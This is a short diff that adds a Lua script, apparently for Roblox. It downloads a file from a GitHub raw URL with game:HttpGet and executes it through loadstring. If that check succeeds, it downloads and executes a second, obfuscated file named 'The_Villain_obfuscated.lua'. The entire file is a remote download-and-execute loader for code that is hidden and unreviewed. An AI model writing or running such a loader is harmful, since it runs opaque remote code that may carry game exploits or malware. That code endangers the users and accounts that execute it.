@@ -1,0 +1,6 @@
+local success = loadstring(game:HttpGet("https://raw.githubusercontent.com/Jskfhggjxu/My-Script/refs/heads/main/check-acc-cmds.lua"))()
+if success then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Jskfhggjxu/My-Script/refs/heads/main/The_Villain_obfuscated.lua"))()
+else
+    return
+end
